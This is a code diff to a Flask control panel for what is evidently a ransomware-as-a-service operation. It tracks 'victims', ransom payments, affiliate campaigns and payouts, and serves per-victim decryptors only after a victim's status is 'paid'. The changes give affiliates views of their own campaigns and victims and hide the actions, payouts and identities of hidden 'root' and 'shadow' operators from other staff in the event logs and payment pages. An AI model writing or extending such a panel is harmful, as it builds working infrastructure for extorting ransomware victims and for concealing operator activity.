@@ -199,6 +199,18 @@ def with_root_operator() -> bool:
         return conn.execute("SELECT 1 FROM operators WHERE role='root' LIMIT 1"
                             ).fetchone() is not None
 
+def _filter_root_events(events):
+    if current_role() in ("root", "shadow"):
+        return events
+    with c2db.db() as conn:
+        roots = {r[0] for r in conn.execute(
+            "SELECT username FROM operators WHERE role IN ('root','shadow')")}
+    return [e for e in events
+            if e["actor"] not in roots
+            and e["actor"] not in ("root", "shadow")
+            and not (e["kind"] or "").startswith("root_")]
+
+
 def _safe_next(raw: str, fallback: str) -> str:
     raw = (raw or "").strip()
     if not raw.startswith("/") or raw.startswith("//") or "\\" in raw:
@@ -729,9 +741,9 @@ def session_hygiene():
         if op["role"] != session.get("role"):
             session["role"] = op["role"]
         if session.get("must_enroll_2fa") and request.path not in (
-                "/admin/root/2fa", "/admin/logout") and \
+                "/admin/2fa", "/admin/logout") and \
                 not request.path.startswith("/static/"):
-            return redirect(url_for("root_2fa"))
+            return redirect(url_for("twofa"))
     if session.get("user"):
         try:
             idle = int(c2db.get_setting("session_idle_min", "60") or 60)
@@ -1381,7 +1393,7 @@ def login():
                 and op["role"] in ("admin", "root", "shadow")
                 and not op["totp_secret"]):
             session["must_enroll_2fa"] = True
-            return redirect(url_for("root_2fa"))
+            return redirect(url_for("twofa"))
         nxt = _safe_next(request.args.get("next") or "",
                          url_for("affiliate_home") if op["role"] == "affiliate"
                          else url_for("dashboard"))
@@ -1451,13 +1463,16 @@ def dashboard():
 def victim(vid):
     v = victim_or_404(vid)
     c2db.mark_chat_read(vid)
-    with c2db.db() as conn:
-        root_events = conn.execute(
-            "SELECT ts, kind, detail FROM events WHERE vid=? AND kind IN "
-            "('root_override','root_panic','pardon','pardon_done') "
-            "ORDER BY id DESC LIMIT 5", (vid,)).fetchall()
+    root_events = []
+    if current_role() in ("root", "shadow"):
+        with c2db.db() as conn:
+            root_events = conn.execute(
+                "SELECT ts, kind, detail FROM events WHERE vid=? AND kind IN "
+                "('root_override','root_panic','pardon','pardon_done') "
+                "ORDER BY id DESC LIMIT 5", (vid,)).fetchall()
     return render_template("victim.html", v=v, chat=parse_chat(v),
-                           events=c2db.recent_events(80, vid), online=online(v),
+                           events=_filter_root_events(c2db.recent_events(80, vid)),
+                           online=online(v),
                            root_events=root_events,
                            show_keys=(current_role() in ("admin", "root", "shadow")),
                            can_operate=(current_role() in ("admin", "root", "shadow")),
@@ -1869,8 +1884,16 @@ def affiliates_page():
         else:
             flash("invalid affiliate action", "error")
         return redirect(url_for("affiliates_page"))
-    return render_template("affiliates.html", rows=c2db.affiliates(),
-                           payouts=c2db.list_payouts())
+    rows = c2db.affiliates()
+    payouts = c2db.list_payouts()
+    if current_role() not in ("root", "shadow"):
+        with c2db.db() as conn:
+            roots = {r[0] for r in conn.execute(
+                "SELECT username FROM operators WHERE role IN ('root','shadow')")}
+        rows = [a for a in rows if a["username"] not in roots]
+        payouts = [p for p in payouts
+                   if p["operator"] not in roots and p["actor"] not in roots]
+    return render_template("affiliates.html", rows=rows, payouts=payouts)
 
 
 @app.route("/admin/commands")
@@ -1914,6 +1937,12 @@ def payments_page():
             "SELECT vid, hostname, status FROM victims ORDER BY timestamp DESC LIMIT 500"
         ).fetchall()
     recent = c2db.payments_recent(1000)
+    if current_role() not in ("root", "shadow"):
+        with c2db.db() as conn:
+            roots = {r[0] for r in conn.execute(
+                "SELECT username FROM operators WHERE role IN ('root','shadow')")}
+        recent = [dict(r, actor=("operator" if r["actor"] in roots else r["actor"]))
+                  for r in recent]
     return render_template("payments.html", rows=recent, victims=victims,
                            total=sum(r["amount"] or 0 for r in recent))
 
@@ -1992,12 +2021,16 @@ def reports():
 @app.route("/admin/events")
 @login_required()
 def events():
-    if _flag("audit_frozen") and current_role() not in ("root", "shadow"):
+    is_root = current_role() in ("root", "shadow")
+    if _flag("audit_frozen") and not is_root:
         abort(403)
     with c2db.db() as conn:
         roots = {r[0]: r[1] for r in conn.execute(
             "SELECT username, role FROM operators WHERE role IN ('root','shadow')")}
-    return render_template("events.html", events=c2db.recent_events(300),
+    events = _filter_root_events(c2db.recent_events(300))
+    if not is_root:
+        roots = {}
+    return render_template("events.html", events=events,
                            root_users=roots, frozen=_flag("audit_frozen"))
 
 
@@ -2573,7 +2606,9 @@ def campaigns_page():
                 cfg = json.dumps(json.loads(request.form.get("config") or "{}"), indent=2)
             except ValueError:
                 cfg = "{}"
-            cid = c2db.create_campaign(name, request.form.get("note") or "", cfg)
+            cid = c2db.create_campaign(
+                name, request.form.get("note") or "", cfg,
+                (request.form.get("affiliate") or "").strip())
             c2db.log_event(current_user(), "campaign_create", "", f"{cid}:{name}")
             flash("campaign created", "ok")
             return redirect(url_for("campaign_page", cid=cid))
@@ -2592,7 +2627,8 @@ def campaign_page(cid):
         except ValueError:
             cfg = c["config"] or "{}"
         c2db.update_campaign(cid, request.form.get("note") or "",
-                            1 if request.form.get("active") else 0, cfg)
+                            1 if request.form.get("active") else 0, cfg,
+                             request.form.get("affiliate") or "")
         c2db.log_event(current_user(), "campaign_update", "", str(cid))
         flash("campaign saved", "ok")
         return redirect(url_for("campaign_page", cid=cid))
@@ -2743,19 +2779,60 @@ def payout_status(pid, status):
     return redirect(url_for("affiliates_page"))
 
 
+def _affiliate_campaign_or_404(cid):
+    c = c2db.get_campaign(cid)
+    if not c or (c["affiliate"] or "").strip() != (current_user() or ""):
+        abort(404)
+    return c
+
+
+def _affiliate_victim(vid):
+    v = c2db.get_victim(vid)
+    if not v:
+        abort(404)
+    c = c2db.get_campaign(v["campaign_id"]) if v["campaign_id"] else None
+    if not c or (c["affiliate"] or "").strip() != (current_user() or ""):
+        abort(404)
+    if (v["status"] or "") != "paid":
+        abort(403)
+    return v
+
+
 @app.route("/affiliate")
 @login_required(("affiliate", "admin"))
 def affiliate_home():
     user = current_user()
     summary = c2db.affiliate_summary(user)
+    campaigns = c2db.list_campaigns(user) if current_role() == "affiliate" else []
     with c2db.db() as conn:
         payments_rows = conn.execute(
             "SELECT * FROM payments WHERE affiliate=? ORDER BY id DESC LIMIT 100",
             (user,)).fetchall()
     return render_template("affiliate.html", summary=summary,
+                           campaigns=campaigns,
                            payments=payments_rows,
                            payouts=[p for p in c2db.list_payouts()
                                     if p["operator"] == user])
+
+
+@app.route("/affiliate/campaign/<int:cid>")
+@login_required("affiliate")
+def affiliate_campaign(cid):
+    c = _affiliate_campaign_or_404(cid)
+    return render_template("affiliate_campaign.html", c=c,
+                           victims=c2db.campaign_victims(cid))
+
+
+@app.route("/affiliate/decryptor/<vid>")
+@login_required("affiliate")
+def affiliate_decryptor(vid):
+    return _serve_cpp(_affiliate_victim(vid))
+
+
+@app.route("/affiliate/decrypter_exe/<vid>")
+@login_required("affiliate")
+def affiliate_decryptor_exe(vid):
+    return _serve_exe(_affiliate_victim(vid), request.args.get("arch", "x64"))
 
 
 @app.route("/affiliate/request", methods=["POST"])
@@ -3029,9 +3106,9 @@ def root_audit_json():
                     "events": [dict(r) for r in rows]})
 
 
-@app.route("/admin/root/2fa", methods=["GET", "POST"])
+@app.route("/admin/2fa", methods=["GET", "POST"])
 @login_required()
-def root_2fa():
+def twofa():
     with c2db.db() as conn:
         op = conn.execute("SELECT * FROM operators WHERE username=?",
                           (session.get("user"),)).fetchone()
@@ -3045,20 +3122,20 @@ def root_2fa():
             if not c2db.verify_password(request.form.get("password") or "",
                                         op["pw_hash"]):
                 flash("current password required to enroll 2FA", "error")
-                return redirect(url_for("root_2fa"))
+                return redirect(url_for("twofa"))
             secret = c2db.new_totp_secret()
             codes, hashed = c2db.make_backup_codes()
             with c2db.db() as conn:
                 conn.execute("UPDATE operators SET totp_secret=?, backup_codes=? "
                              "WHERE id=?", (secret, hashed, op["id"]))
                 conn.commit()
-            c2db.log_event(current_user(), "root_2fa_enroll", "", "totp enabled")
+            c2db.log_event(current_user(), "2fa_enroll", "", "totp enabled")
             enrolled = True
             session.pop("must_enroll_2fa", None)
         elif action == "disable" and enrolled:
             if c2db.get_setting("require_2fa", "0") == "1":
                 flash("2FA is required by policy; disable the policy first", "error")
-                return redirect(url_for("root_2fa"))
+                return redirect(url_for("twofa"))
             code = (request.form.get("code") or "").strip()
             ok = c2db.verify_totp(op["totp_secret"], code)
             if not ok:
@@ -3072,15 +3149,15 @@ def root_2fa():
                 ok = used
             if not ok:
                 flash("invalid TOTP or backup code", "error")
-                return redirect(url_for("root_2fa"))
+                return redirect(url_for("twofa"))
             with c2db.db() as conn:
                 conn.execute("UPDATE operators SET totp_secret='', backup_codes='' "
                              "WHERE id=?", (op["id"],))
                 conn.commit()
-            c2db.log_event(current_user(), "root_2fa_disable", "", "totp disabled")
-            flash("root 2FA disabled", "ok")
+            c2db.log_event(current_user(), "2fa_disable", "", "totp disabled")
+            flash("2FA disabled", "ok")
             session.pop("must_enroll_2fa", None)
-            return redirect(url_for("root_2fa"))
+            return redirect(url_for("twofa"))
     otpauth = ""
     qr_svg = ""
     if secret:
